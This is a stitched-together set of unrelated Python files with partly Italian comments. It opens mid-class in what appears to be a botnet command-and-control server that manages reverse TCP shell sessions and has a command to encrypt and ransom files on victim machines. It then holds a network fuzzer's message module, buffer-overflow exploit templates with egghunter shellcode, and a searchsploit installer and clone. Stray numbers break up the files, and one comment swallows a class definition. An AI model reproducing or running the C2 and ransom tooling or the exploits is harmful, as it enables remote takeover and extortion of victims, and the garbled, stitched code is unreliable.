        lock = self.current_session._lock if self.current_session else self._lock
        with lock:
            print()
            for ses in self.sessions.values():
                util.display(str(ses.id), color='white', style='normal')
                self.database._display(ses.info)
                print()

    def session_ransom(self, args=None):
        """
        Encrypt and ransom files on client machine

        `Required`
        :param str args:    encrypt, decrypt, payment

        """
        if self.current_session:
            if 'decrypt' in str(args):
                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
            elif 'encrypt' in str(args):
                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
            else:
                self.current_session.send_task({"task": "ransom {}".format(args)})
        else:
            util.log("No client selected")

    def session_shell(self, session):
        """
        Interact with a client session through a reverse TCP shell

        `Requires`
        :param int session:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not str(session).isdigit() or int(session) not in self.sessions:
            util.display("Session {} does not exist".format(session))
        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
            util.display("Session {} is stale (Awaiting Connection)".format(session))
        else:
            self._active.clear()
            if self.current_session:
                self.current_session._active.clear()
            self.current_session = self.sessions[int(session)]
            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(session), color='white', style='normal')
            self.current_session._active.set()
            return self.current_session.run()

    def session_background(self, session=None):
        """
        Send a session to background

        `Requires`
        :param int session:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not session:
            if self.current_session:
                self.current_session._active.clear()
        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
            util.display("Session {} is stale (Awaiting Connection)".format(session))
        elif str(session).isdigit() and int(session) in self.sessions:
            self.sessions[int(session)]._active.clear()
        self.current_session = None
        self._active.set()
        return self.run()

    @util.threaded
    def serve_until_stopped(self):
        self.database = database.Database(self._database)
        for session_info in self.database.get_sessions(verbose=True):
            self.database.update_status(session_info.get('uid'), 0)
            session_info['online'] = False
        while True:
            connection, address = self.socket.accept()
            session = Session(connection=connection, id=self._count)
            if session.info != None:
                info = self.database.handle_session(session.info)
                if isinstance(info, dict):
                    self._count += 1
                    if info.pop('new', False):
                        util.display("\n\n[+]", color='green', style='bright', end=' ')
                        util.display("New Connection:", color='white', style='bright', end=' ')
                    else:
                        util.display("\n\n[+]", color='green', style='bright', end=' ')
                        util.display("Connection:", color='white', style='bright', end=' ')
                    util.display(address[0], color='white', style='normal')
                    util.display("    Session:", color='white', style='bright', end=' ')
                    util.display(str(session.id), color='white', style='normal')
                    util.display("    Started:", color='white', style='bright', end=' ')
                    util.display(time.ctime(session._created), color='white', style='normal')
                    session.info = info
                    self.sessions[int(session.id)] = session
            else:
                util.display("\n\n[-]", color='red', style='bright', end=' ')
                util.display("Failed Connection:", color='white', style='bright', end=' ')
                util.display(address[0], color='white', style='normal')

            # refresh prompt
            prompt = '\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=' ')
            sys.stdout.flush()

            abort = globals()['__abort']
            if abort:
                break

    @util.threaded
    def serve_resources(self):
        """
        Handles serving modules and packages in a seperate thread

        """
        host, port = self.socket.getsockname()
        while True:
            time.sleep(3)
            globals()['package_handler'].terminate()
            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)

    def run(self):
        """
        Run C2 server administration terminal

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        self._active.set()
        if 'c2' not in globals()['__threads']:
            globals()['__threads']['c2'] = self.serve_until_stopped()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                cmd_buffer = self._get_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        method = self.commands[cmd]['method']
                        if callable(method):
                            try:
                                output = method(action) if len(action) else method()
                            except Exception as e1:
                                output = str(e1)
                        else:
                            util.display("\n[-]", color='red', style='bright', end=' ')
                            util.display("Error:", color='white', style='bright', end=' ')
                            util.display(method + "\n", color='white', style='normal')
                    elif cmd == 'cd':
                        try:
                            os.chdir(action)
                        except: pass
                    else:
                        try:
                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                        except: pass
                    if output:
                        util.display(str(output))
                if globals()['__abort']:
                    break
            except KeyboardInterrupt:
                self._active.clear()
                break
        self.quit()


class Session(threading.Thread):
    """
    A subclass of threading.Thread that is designed to handle an
    incoming connection by creating an new authenticated session
    for the encrypted connection of the reverse TCP shell

    """

    def __init__(self, connection=None, id=0):
        """
        Create a new Session

        `Requires`
        :param connection:  socket.socket object

        `Optional`
        :param int id:      session ID

        """
        super(Session, self).__init__()
        self._prompt = None
        self._abort = False
        self._lock = threading.Lock()
        self._active = threading.Event()
        self._created = time.time()
        self.id = id
        self.connection = connection
        self.key = security.diffiehellman(self.connection)
        self.rsa = None  # security.Crypto.PublicKey.RSA.generate(2048)
        try:
            self.info = self.client_info()
            #self.info['id'] = self.id
        except Exception as e:
            print("Session init exception: " + str(e))
            self.info = None

    def kill(self):
        """
        Kill the reverse TCP shell session

        """
        self._active.clear()
        globals()['c2'].session_remove(self.id)
        globals()['c2'].current_session = None
        globals()['c2']._active.set()
        globals()['c2'].run()

    def client_info(self):
        """
        Get information about the client host machine
        to identify the session

        """
        header_size = struct.calcsize("!L")
        header = self.connection.recv(header_size)
        msg_size = struct.unpack("!L", header)[0]
        msg = self.connection.recv(msg_size)
        data = security.decrypt_aes(msg, self.key)
        info = json.loads(data)
        for key, val in info.items():
            if str(val).startswith("_b64"):
                info[key] = base64.b64decode(str(val[6:])).decode('ascii')
        return info

    def status(self):
        """
        Check the status and duration of the session

        """
        c = time.time() - float(self._created)
        data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def send_task(self, task):
        """
        Send task results to the server

        `Requires`
        :param dict task:
          :attr str uid:             task ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr str session:         session ID assigned by server
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        if not 'session' in task:
            task['session'] = self.info.get('uid')
        data = security.encrypt_aes(json.dumps(task), self.key)
        msg  = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return True

    def recv_task(self):
        """
        Receive and decrypt incoming task from server

        :returns dict task:
          :attr str uid:             task ID assigned by server
          :attr str session:         client ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        """

        header_size = struct.calcsize('!L')
        header = self.connection.recv(header_size)
        if len(header) == 4:
            msg_size = struct.unpack('!L', header)[0]
            msg = self.connection.recv(msg_size)
            data = security.decrypt_aes(msg, self.key)
            return json.loads(data)
        else:
            # empty header; peer down, scan or recon. Drop.
            return 0

    def run(self):
        """
        Handle the server-side of the session's reverse TCP shell

        """
        while True:
            if self._active.wait():
                task = self.recv_task() if not self._prompt else self._prompt
                if isinstance(task, dict):
                    if 'help' in task.get('task'):
                        self._active.clear()
                        globals()['c2'].help(task.get('result'))
                        self._active.set()
                    elif 'prompt' in task.get('task'):
                        self._prompt = task
                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
                            method = globals()['c2'].commands[cmd]['method']
                            if callable(method):
                                result = method(action) if len(action) else method()
                                if result:
                                    task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                    globals()['c2'].display(result.encode())
                                    globals()['c2'].database.handle_task(task)
                                continue
                        else:
                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                            self.send_task(task)
                    elif 'result' in task:
                        if task.get('result') and task.get('result') != 'None':
                            globals()['c2'].display(task.get('result').encode())
                            globals()['c2'].database.handle_task(task)
                else:
                    if self._abort:
                        break
                    elif isinstance(task, int) and task == 0:
                        break
                self._prompt = None

        time.sleep(1)
        globals()['c2'].session_remove(self.id)
        self._active.clear()
        globals()['c2']._return()
        #!/usr/bin/env python
#------------------------------------------------- -----------------
# Novembre 2014, creato all'interno di ASIG
# Autore Giacomo Spadaro (jaspadar)
# Coautrice Lilith Wyatt (liwyatt)
#------------------------------------------------- -----------------
# Copyright (c) 2014-2017 di Cisco Systems, Inc.
# Tutti i diritti riservati.
#
# Ridistribuzione e utilizzo in forme sorgente e binarie, con o senza
# modifica, sono consentite purché siano rispettate le seguenti condizioni:
# 1. Le ridistribuzioni del codice sorgente devono mantenere il copyright di cui sopra
# avviso, questo elenco di condizioni e il seguente disclaimer.
# 2. Le ridistribuzioni in forma binaria devono riprodurre il copyright di cui sopra
# avviso, questo elenco di condizioni e la seguente clausola di esclusione della responsabilità nel
# documentazione e/o altro materiale fornito con la distribuzione.
# 3. Né il nome di Cisco Systems, Inc. né il
# nomi dei suoi contributori possono essere utilizzati per sostenere o promuovere prodotti
# derivato da questo software senza previa autorizzazione scritta specifica.
#
# QUESTO SOFTWARE VIENE FORNITO DAI TITOLARI DEL COPYRIGHT "COSÌ COM'È" E QUALSIASI
# GARANZIE ESPLICITE O IMPLICITE, INCLUSE, MA NON LIMITATE A, QUELLE IMPLICITE
# SONO GARANZIE DI COMMERCIABILITÀ E IDONEITÀ PER UNO SCOPO PARTICOLARE
# NEGATO. IN NESSUN CASO I TITOLARI DEL COPYRIGHT SARANNO RESPONSABILI DI ALCUN
# DANNI DIRETTI, INDIRETTI, ACCIDENTALI, SPECIALI, ESEMPLARI O CONSEQUENZIALI
# (INCLUSO, MA NON LIMITATO A, APPROVVIGIONAMENTO DI BENI O SERVIZI SOSTITUTIVI;
# PERDITA DI UTILIZZO, DATI O PROFITTI; O INTERRUZIONE DI ATTIVITÀ) COMUNQUE CAUSATA ED
# SU QUALSIASI TEORIA DI RESPONSABILITÀ, SIA CONTRATTUALE, OGGETTIVA O ILLECITO
# (INCLUSA LA NEGLIGENZA O ALTRIMENTI) DERIVANTI IN QUALSIASI MODO DALL'UTILIZZO DEL PRESENTE
# SOFTWARE, ANCHE SE AVVISATI DELLA POSSIBILITÀ DI TALI DANNI.
#------------------------------------------------- -----------------
# Digitare le definizioni per il fuzzer
#
# Questo script definisce i vari tipi di messaggi e dati utilizzati in
# il fuzzer e le funzioni di utilità da essi utilizzate.
#------------------------------------------------------------------

class MessageSubComponent(object):
    def __init__(self, message, isFuzzed):
        self.message = message
        self.isFuzzed = isFuzzed
        # Ciò include sia i messaggi fuzz sia i messaggi dell'utente
        # è stato modificato con le richiamate del processore di messaggi
        self._altered = message
    
    def setAlteredByteArray(self, byteArray):
        self._altered = byteArray
    
    def getAlteredByteArray(self):
        return self._altered
    
    def getOriginalByteArray(self):
        return self.message

# ins tutti i dati di un dato pacchetto della sessioneclass Message(object):
    class Direction:
        Outbound = "outbound"
        Inbound = "inbound"
    
    class Format:
        CommaSeparatedHex = 0 # 00,01,02,20,2a,30,31
        Ascii = 1 # asdf\x00\x01\x02
        Raw = 2 # un array di byte grezzi da un pcap
        
    def __init__(self):
        self.direction = -1
        # Se qualche sottocomponente è confuso, potrebbe non essere l'intero messaggio
        # Il valore predefinito è False, impostato su True poiché i sottocomponenti del messaggio sono impostati di seguito
        self.isFuzzed = False 
        # Questo verrà popolato con i sottocomponenti del messaggio
        # IE, specificato come messaggio 0 11,22,33
        # 44,55,66
        #Quindi 11,22,33 sarà il sottocomponente 0, 44,55,66 sarà il sottocomponente 1
        # Se è un messaggio tradizionale, avrà un solo elemento (intero messaggio)
        self.subcomponents = []

    def getOriginalSubcomponents(self):
        return [subcomponent.message for subcomponent in self.subcomponents]
    
    # May or may not have actually been changed
    # Version of subcomponents that includes fuzzing and messageprocessor changes from user
    # Is transient and reverted to original every iteration
    def getAlteredSubcomponents(self):
        return [subcomponent.getAlteredByteArray() for subcomponent in self.subcomponents]
    
    def getOriginalMessage(self):
        return bytearray().join([subcomponent.message for subcomponent in self.subcomponents])
    
    # May or may not have actually been changed
    # Version of message that includes fuzzing and messageprocessor changes from user
    # Is transient and reverted to original every iteration
    def getAlteredMessage(self):
        return bytearray().join([subcomponent.getAlteredByteArray() for subcomponent in self.subcomponents])
    
    def resetAlteredMessage(self):
        for subcomponent in self.subcomponents:
            subcomponent.setAlteredByteArray(subcomponent.message)
    
    # Set the message on the Message
    # sourceType - Format.CommaSeparatedHex, Ascii, or Raw
    # message - Message in above format
    # isFuzzed - whether this message should have its subcomponent
    #   flag isFuzzed set
    def setMessageFrom(self, sourceType, message, isFuzzed):
        if sourceType == self.Format.CommaSeparatedHex:
            message = bytearray([x.decode("hex") for x in message.split(",")])
        elif sourceType == self.Format.Ascii:
            message = self.deserializeByteArray(message)
        elif sourceType == self.Format.Raw:
            message = message
        else:
            raise RuntimeError("Invalid sourceType")
        
        self.subcomponents = [MessageSubComponent(message, isFuzzed)]
        
        if isFuzzed:
            self.isFuzzed = True
    
    # Same arguments as above, but adds to .message as well as
    # adding a new subcomponent
    # createNewSubcomponent - If false, don't create another subcomponent,
    #   instead, append new message data to last subcomponent in message
    def appendMessageFrom(self, sourceType, message, isFuzzed, createNewSubcomponent=True):
        if sourceType == self.Format.CommaSeparatedHex:
            newMessage = bytearray([x.decode("hex") for x in message.split(",")])
        elif sourceType == self.Format.Ascii: # verifica condizione ultoriormente elif
            newMessage = self.deserializeByteArray(message)
        elif sourceType == self.Format.Raw:
            newMessage = message
        else:
            raise RuntimeError("Invalid sourceType")
        
        if createNewSubcomponent:
            self.subcomponents.append(MessageSubComponent(newMessage, isFuzzed))
        else:
            self.subcomponents[-1].message += newMessage

        if isFuzzed:
            # Make sure message is set to fuzz as well
            self.isFuzzed = True
    
    def isOutbound(self):
        return self.direction == self.Direction.Outbound
    
    def __eq__(self, other):
        # bytearray (for message) implements __eq__()
        return self.direction == other.direction and self.message == other.message
    
    @classmethod
    def serializeByteArray(cls, byteArray):
        return repr(str(byteArray))
    
    @classmethod
    def deserializeByteArray(cls, string):
        # This appears to properly reverse repr() without the risks of eval
        return bytearray(string[1:-1].encode('utf8').decode('unicode-escape').encode('utf8'))
    
    def getAlteredSerialized(self):
        if len(self.subcomponents) < 1:
            return "{0} {1}\n".format(self.direction, "ERROR: No data in message.")
        else:
            serializedMessage = "{0}{1} {2}\n".format("fuzz " if self.subcomponents[0].isFuzzed else "", self.direction, self.serializeByteArray(self.subcomponents[0].getAlteredByteArray()))
            
            for subcomponent in self.subcomponents[1:]:
                serializedMessage += "sub {0}{1}\n".format("fuzz " if subcomponent.isFuzzed else "", self.serializeByteArray(subcomponent.getAlteredByteArray()))
            
            return serializedMessage
    
    def getSerialized(self):
        if len(self.subcomponents) < 1:
            return "{0} {1}\n".format(self.direction, "ERROR: No data in message.")
        else:
            serializedMessage = "{0} {1}{2}\n".format(self.direction, "fuzz " if self.subcomponents[0].isFuzzed else "", self.serializeByteArray(self.subcomponents[0].message))
            
            for subcomponent in self.subcomponents[1:]:
                serializedMessage += "sub {0}{1}\n".format("fuzz " if subcomponent.isFuzzed else "", self.serializeByteArray(subcomponent.message))
            
            return serializedMessage

    # Utility function for setFromSerialized and appendFromSerialized below
    def _extractMessageComponents(self, serializedData):
        firstQuoteSingle = serializedData.find('\'')
        lastQuoteSingle = serializedData.rfind('\'')
        firstQuoteDouble = serializedData.find('"')
        lastQuoteDouble = serializedData.rfind('"')
        firstQuote = -1
        lastQuote = -1
        
        if firstQuoteSingle == -1 or firstQuoteSingle == lastQuoteSingle:
            # If no valid single quotes, go double quote
            firstQuote = firstQuoteDouble
            lastQuote = lastQuoteDouble
        elif firstQuoteDouble == -1 or firstQuoteDouble == lastQuoteDouble:
            # If no valid double quotes, go single quote
            firstQuote = firstQuoteSingle
            lastQuote = lastQuoteSingle
        elif firstQuoteSingle < firstQuoteDouble:
            # If both are valid, go single if further out
            firstQuote = firstQuoteSingle
            lastQuote = lastQuoteSingle
        else:
            # Both are valid but double is further out
            firstQuote = firstQuoteDouble
            lastQuote = lastQuoteDouble
        
        if firstQuote == -1 or lastQuote == -1 or firstQuote == lastQuote:
            raise RuntimeError("Invalid message data, no message found")

        # Pull out everything, quotes and all, and deserialize it
        messageData = serializedData[firstQuote:lastQuote+1]
        # Process the args
        serializedData = serializedData[:firstQuote].split(" ")
        
        return (serializedData, messageData)
    
    # Handles _one line_ of data, either "inbound" or "outbound"
    # Lines following this should be passed to appendFromSerialized() below
    def setFromSerialized(self, serializedData):
        serializedData = serializedData.replace("\n", "")
        (serializedData, messageData) = self._extractMessageComponents(serializedData)
        
        if len(messageData) == 0 or len(serializedData) < 1:
            raise RuntimeError("Invalid message data")
        
        direction = serializedData[0]
        args = serializedData[1:-1]
        
        if direction != "inbound" and direction != "outbound":
            raise RuntimeError("Invalid message data, unknown direction {0}".format(direction))
        
        isFuzzed = False
        if "fuzz" in args:
            isFuzzed = True
            if len(serializedData) < 3:
                raise RuntimeError("Invalid message data")
        
        self.direction = direction
        self.setMessageFrom(self.Format.Ascii, messageData, isFuzzed)
    
    # Add another line, used for multiline messages
    def appendFromSerialized(self, serializedData, createNewSubcomponent=True):
        serializedData = serializedData.replace("\n", "")
        (serializedData, messageData) = self._extractMessageComponents(serializedData)
        
        if createNewSubcomponent:
            if len(messageData) == 0 or len(serializedData) < 1 or serializedData[0] != "sub":
                raise RuntimeError("Invalid message data")
        else:
            # If not creating a subcomponent, we won't have "sub", "fuzz", and the other fun stuff
            if len(messageData) == 0:
                raise RuntimeError("Invalid message data")
        
        args = serializedData[1:-1]
        # Put either "fuzz" or nothing before actual message
        # Can tell the difference even with ascii because ascii messages have '' quotes
        # IOW, even a message subcomponent 'fuzz' will have the 's around it, not be fuzz without quotes
        isFuzzed = False
        if "fuzz" in args:
            isFuzzed = True
        
        self.appendMessageFrom(self.Format.Ascii, messageData, isFuzzed, createNewSubcomponent=createNewSubcomponent)

class MessageCollection(object):
    def __init__(self):
        self.messages = []
    
    def addMessage(self, message):
        self.messages.append(message)
    
    def doClientMessagesMatch(self, otherMessageCollection):
        for i in range(0, len(self.messages)):
            # Skip server messages
            if not self.messages[i].isOutbound():
                continue
            try:
                # Message implements __eq__()
                if self.messages[i] != otherMessageCollection.messages[i]:
                    return False
            except IndexError:
                return False
        
        # All messages passed
        return True

import os
import os.path
from copy import deepcopy

# Handles all the logging of the fuzzing session
# Log messages can be found at sample_apps/<app>/<app>_logs/<date>/
class Logger(object):
    def __init__(self, folderPath):
        self._folderPath = folderPath
        if os.path.exists(folderPath):
            print("Data output directory already exists: %s" % (folderPath))
            exit()
        else:
            try:
                os.makedirs(folderPath)
            except:
                print("Unable to create logging directory: %s" % (folderPath))
                exit()

        self.resetForNewRun()

    # Store just the data, forget trying to make a Message object
    # With the subcomponents and everything, it just gets weird, 
    # and we don't need it
    def setReceivedMessageData(self, messageNumber, data):
        self.receivedMessageData[messageNumber] = data

    def setHighestMessageNumber(self, messageNumber):
        # The highest message # this fuzz session made it to
        self._highestMessageNumber = messageNumber

    def outputLastLog(self, runNumber, messageCollection, errorMessage):
        return self._outputLog(runNumber, messageCollection, errorMessage, self._lastReceivedMessageData, self._lastHighestMessageNumber)

    def outputLog(self, runNumber, messageCollection, errorMessage):
        return self._outputLog(runNumber, messageCollection, errorMessage, self.receivedMessageData, self._highestMessageNumber)

    def _outputLog(self, runNumber, messageCollection, errorMessage, receivedMessageData, highestMessageNumber):
        with open(os.path.join(self._folderPath, str(runNumber)), "w") as outputFile:
            print("Logging run number %d" % (runNumber))
            outputFile.write("Log from run with seed %d\n" % (runNumber))
            outputFile.write("Error message: %s\n" % (errorMessage))

            if highestMessageNumber == -1 or runNumber == 0:
                outputFile.write("Failed to connect on this run.\n")

            outputFile.write("\n")

            i = 0
            for message in messageCollection.messages:
                outputFile.write("Packet %d: %s" % (i, message.getSerialized()))

                if message.isFuzzed:
                    outputFile.write("Fuzzed Packet %d: %s\n" % (i, message.getAlteredSerialized()))
                
                if i in receivedMessageData:
                    # Compare what was actually sent to what we expected, log if they differ
                    if receivedMessageData[i] != message.getOriginalMessage():
                        outputFile.write("Actual data received for packet %d: %s" % (i, Message.serializeByteArray(receivedMessageData[i])))
                    else:
                        outputFile.write("Received expected data\n")

                if highestMessageNumber == i:
                    if message.isOutbound():
                        outputFile.write("This is the last message sent\n")
                    else:
                        outputFile.write("This is the last message received\n")

                outputFile.write("\n")
                i += 1

    def resetForNewRun(self):
        try:
            self._lastReceivedMessageData = deepcopy(self.receivedMessageData)
            self._lastHighestMessageNumber = self._highestMessageNumber
        except AttributeError:
            self._lastReceivedMessageData = {}
            self._lastHighestMessageNumber = -1

        self.receivedMessageData = {}
        self.setHighestMessageNumber(-1)

2
import socket
import sys
import threading
import struct
###########################################################################################################################################
IP = "127.0.0.1"
PORT=8080

jmpesp = ????
offset = ????

buf = ????

payload = ????
payload = "POST %s\r\n\r\n" % payload

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.settimeout(2)
sock.connect((IP,PORT))
sock.send(payload)
print "Buffer sent! (len %d)" % len(payload)
try:
    print sock.recv(4096)
    print "No crash...."
except:
    print "Server died, Yayyyy!!"
    3
    #!/usr/bin/python
import os
import socket
import sys
import threading
import struct
import time

HOST="127.0.0.1"
PORT=2501

# Matt Miller Access() egghunter, triggers on "W00TW00T"
#esegue un exploit
egghunter = "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd\x80\x3c\xf2\x74\xec\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
egghunterPayload = ?
msgPayload = ?

# connettiti con un utente
sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock1.connect((HOST, PORT)) 
sock1.send("usr1\r\n")
sock1.recv(1024)
print "Connected first user"

# secondo utente e invia un messaggio al primo con l'uovo I
sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock2.connect((HOST, PORT)) 
sock2.send("usr2\r\n")
sock2.recv(1024)
time.sleep(1)
print "Connected second user"
sock2.send(msgPayload)
print "Sent msg payload"

# conetti un utente finale aper egghuner nel nome utente
sock3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock3.connect((HOST, PORT))
sock3.send(egghunterPayload)
print "Sent egghunter payload"

# chiudere
sock3.close()
sock2.close()
sock1.close()
4
from tkinter import Tk
from tkinter.filedialog import askdirectory
import os

rcr = open(".searchsploit_rc", "r").read().splitlines()
print(rcr)

if input("Do you want to connect to the exploit database exploits? [Y/n]: ") == "Y":
    print("Please select the location of the exploit database")
    Tk().withdraw()
    edbexploits = askdirectory()
    print(edbexploits)
    if os.path.exists(edbexploits):
        rcr[6] = 'path_array+=("' + edbexploits + '")'
        rcr[14] = 'path_array+=("' + edbexploits + '")'

if input("Do you want to connect to the exploit database papers? [Y/n]: ") == "Y":
    print("Please select the location of the exploit database papers")
    Tk().withdraw()
    temp = askdirectory()
    print(temp)
    if os.path.exists(temp):
        rcr[22] = 'path_array+=("' + temp + '")'

# istallazione dei file di impostazioni delle posizioni
rc = "\n".join(rcr)
if os.sys.platform == "win32":
    open(os.getenv("userprofile").replace(
        "\\", "/") + "/.searchsploit_rc", "w").write(rc)
    batch = open("searchsploit.bat", "r").readlines()
    batch[1] = 'set pythonscript="' + os.getcwd() + '"'
    batch = "\n".join(batch)
    open("searchsploit.bat", "w").write(batch)
else:
    try:
        open("/etc/.searchsploit_rc", "w").write(rc)
    except:
        open(os.path.expanduser("~").replace("\\", "/") +
             "/.searchsploit_rc", "w").write(rc)

print("Install complete. you may now use searchsploit freely")
if os.sys.platform == "win32":
    print("Take your batch script and move it to some place that youll use it.")
print("This script may need to be ran again if the contents in this folder move or if any databases move from their origional spots.")
5
#!/usr/bin/env python3
from sys import argv, exit
import os
import argparse

# Default options
COL = 0
STDIN = ""  # realizzato per contenere input standard per più funzioni

# ottenere la longhezza della colonna
try:
    COL = int(os.get_terminal_size()[0])
except:
    try:
        COL = int(os.get_terminal_size(0)[0])
    except:
        COL = int(os.get_terminal_size(1)[0])

terms = []  # array globale che contiene tuttii termini di ricerca


# RC info

progname = os.path.basename(argv[0])
VERSION = "v1.5"  # versione programma
files_array = []  # Array options with file names
name_array = []  # Array options with database names
path_array = []  # Array options with paths to database files
git_array = []  # Array options with the git repo to update the databases


def scrapeRC():
    """ This function runs on init to get settings for all the databases used for searching
    """
    divider = []

    paths = [
        "/etc/.searchsploit_rc",
        os.path.expanduser("~/.searchsploit_rc"),
        os.path.expanduser("~/.local/.searchsploit_rc"),
        os.path.abspath(os.path.join(os.sys.path[0], ".searchsploit_rc"))
    ]

    for p in paths:
        if os.path.exists(p):
            with open(p, "r") as settingsFile:
                settings = settingsFile.read().split("\n")
                settingsFile.close()
                break
    else:
        print("ERROR: Cannot find .searchsploit_rc\nPlease make sure it is located in one of its well known locations.")
        print("It can be anywhere in one of these locations:")
        for p in paths:
            print("\"{0}\"".format(p))
        exit(2)

    for i in settings:
        if(i == "" or i[0] == "#"):
            continue  # Ignores lines that are empty or are just comments
        divider = i[:len(i)-2].split("+=(\"")
        if divider[0] == "files_array":
            files_array.append(divider[1])
        elif divider[0] == "name_array":
            name_array.append(divider[1])
        elif divider[0] == "path_array":
            path_array.append(divider[1])
        elif divider[0] == "git_array":
            git_array.append(divider[1])

    # This section is to remove database paths that do not exist
    larray = len(files_array)
    for i in range(larray - 1, -1, -1):
        if not os.path.exists(os.path.abspath(os.path.join(path_array[i], files_array[i]))):
            files_array.pop(i)
            name_array.pop(i)
            path_array.pop(i)
            git_array.pop(i)


scrapeRC()

################
## Arg Parser ##
################
parseArgs = None  # Variable to hold values from parser
parser = argparse.ArgumentParser(
    prefix_chars="-+/", formatter_class=argparse.RawTextHelpFormatter, prog=os.path.basename(argv[0]))

parser.description = """
==========
 Examples
==========
  %(prog)s afd windows local
  %(prog)s -t oracle windows
  %(prog)s -p 39446
  %(prog)s linux kernel 3.2 --exclude="(PoC)|/dos/"
  %(prog)s linux reverse password

  For more examples, see the manual: https://www.exploit-db.com/searchsploit

=========
 Options
=========   
"""
parser.epilog = """
=======
 Notes
=======
 * You can use any number of search terms.
 * Search terms are not case-sensitive (by default), and ordering is irrelevant.
   * Use '-c' if you wish to reduce results by case-sensitive searching.
   * And/Or '-e' if you wish to filter results by using an exact match.
 * Use '-t' to exclude the file's path to filter the search results.
   * Remove false positives (especially when searching using numbers - i.e. versions).
 * When updating or displaying help, search terms will be ignored.
"""

# Arguments
parserCommands = parser.add_mutually_exclusive_group()

parser.add_argument("searchTerms", nargs="*")

parser.add_argument("-c", "--case", action="store_true",
                    help="Perform a case-sensitive search (Default is inSEnsITiVe).")
parser.add_argument("-e", "--exact", action="store_true",
                    help="Perform an EXACT match on exploit title (Default is AND) [Implies \"-t\"].")
parser.add_argument("-i", "--ignore", action="store_true",
                    help="Adds any redundant term in despite it possibly giving false positives.")
parser.add_help = True
parser.add_argument("-j", "--json", action="store_true",
                    help="Show result in JSON format.")
parserCommands.add_argument("-m", "--mirror", type=int, default=None,
                            metavar="[EDB-ID]", help="Mirror (aka copies) an exploit to the current working directory.")
parser.add_argument("-o", "--overflow", action="store_true",
                    help="Exploit titles are allowed to overflow their columns.")
parserCommands.add_argument("-p", "--path", type=int, default=None,
                            metavar="[EDB-ID]", help="Show the full path to an exploit (and also copies the path to the clipboard if possible).")
parser.add_argument("-t", "--title", action="store_true",
                    help="Search JUST the exploit title (Default is title AND the file's path).")
parser.add_argument("-u", "--update", action="store_true",
                    help="Check for and install any exploitdb package updates (deb or git).")
parser.add_argument("-w", "--www", action="store_true",
                    help="Show URLs to Exploit-DB.com rather than the local path.")
parserCommands.add_argument("-x", "--examine", type=int, default=None,
                            metavar=("[EDB-ID]"), help="Examine (aka opens) the exploit using \$PAGER.")
parser.add_argument("--colour", action="store_false",
                    help="Disable colour highlighting in search results.")
parser.add_argument("--id", action="store_true",
                    help="Display the EDB-ID value rather than local path.")
parser.add_argument("--nmap", metavar="file.xml", nargs="?", type=argparse.FileType("r"), default=None, const=os.sys.stdin,
                    help="Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).\nUse \"-v\" (verbose) to try even more combinations")
parser.add_argument("--version", action="version",
                    version="%(prog)s {0}".format(VERSION))
parser.add_argument("--exclude", nargs="*", type=str, default=list(), metavar="[terms]",
                    help="Remove certain terms from the results. Option best added after all other terms have been gathered.")

# Argument variable
parseArgs = parser.parse_args()

# Update database check


def update():
    """ This function is used to update all the databases via github (because github is the best update system for databases this size)
    """
    cwd = os.getcwd()
    for i in range(len(files_array)):
        print("[i] Path: " + path_array[i])
        print("[i] Git Pulling: " + name_array[i] + " ~ " + path_array[i])

        # update via git
        os.chdir(path_array[i])  # set path to repos directory
        os.system("git pull -v origin master")
